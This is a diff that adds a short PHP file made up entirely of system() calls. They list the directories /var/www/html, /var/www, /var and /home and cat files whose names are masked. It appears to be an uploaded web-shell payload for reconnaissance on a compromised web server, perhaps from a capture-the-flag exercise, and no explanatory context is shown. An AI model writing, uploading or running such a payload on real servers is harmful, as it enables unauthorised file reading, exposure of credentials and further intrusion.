@@ -1,0 +1,9 @@
+<?php
+system("ls -l /var/www/html/");
+system("cat *********************");
+system("ls -l /var/www/");
+system("cat *********************");
+system("ls -l /var/");
+system("cat *********************");
+system("ls -l /home");
+?>
